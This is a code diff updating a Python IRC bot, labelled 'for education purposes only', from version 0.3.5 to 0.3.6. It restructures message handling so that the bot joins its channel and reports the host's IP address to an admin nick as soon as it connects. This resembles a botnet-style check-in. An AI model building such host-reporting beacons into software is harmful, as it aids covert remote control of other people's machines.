@@ -25,8 +25,8 @@
 legal_notice = 'THIS BOT IS FOR EDUCATION PURPOSES ONLY! DO NOT USE IT FOR MALICIOUS INTENT!'
 author = 'Stephen Harris (trackmastersteve@gmail.com)'
 github = 'https://github.com/trackmastersteve/bot.git'
-version = '0.3.5'
-last_modification = '2018.08.23'
+version = '0.3.6'
+last_modification = '2018.08.24'
 
 import ssl
 import sys
@@ -109,22 +109,26 @@ def setmode(mode, target=channel): # Sets given mode to nick or channel.
     ircsock.send(bytes("MODE "+ target +" :"+ mode +"\n", "UTF-8"))
     
 def main():
-    #sendmsg(format(ip) + " Online!", adminname)
-    #joinchan(channel)
     while 1:
         ircmsg = ircsock.recv(2048).decode("UTF-8")
         ircmsg = ircmsg.strip('\n\r')
         print(ircmsg) # Print messages to the screen. (won't allow bot to run in the background.)
         #sendmsg(ircmsg, adminname) # Sends messages to the channel/admin. (Will run in background. But spams admin.)
-
+        
+        if ircmsg.find('NOTICE') != -1:
+            message = ircmsg.split('NOTICE',1)[1].split(':',1)[1]
+            if message.find('*** You are connected') != -1:
+                joinchan(channel)
+                sendmsg(format(ip) + " Online!", adminname)
+                
+        if ircmsg.find('VERSION') != -1:
+            version()
+            
         # Messages come in from IRC in the format of: ":[Nick]!~[hostname]@[IPAddress]PRIVMSG[channel]:[message]"
         if ircmsg.find('PRIVMSG') != -1:
             name = ircmsg.split('!',1)[0][1:]
             message = ircmsg.split('PRIVMSG',1)[1].split(':',1)[1]
 
-            if ircmsg.find('VERSION') != -1:
-                version()
-            
             if len(name) < 17:
                 # Respond to NickServ ident request.
                 if name.lower() == 'nickserv' and message.find('This nickname is registered') != -1:
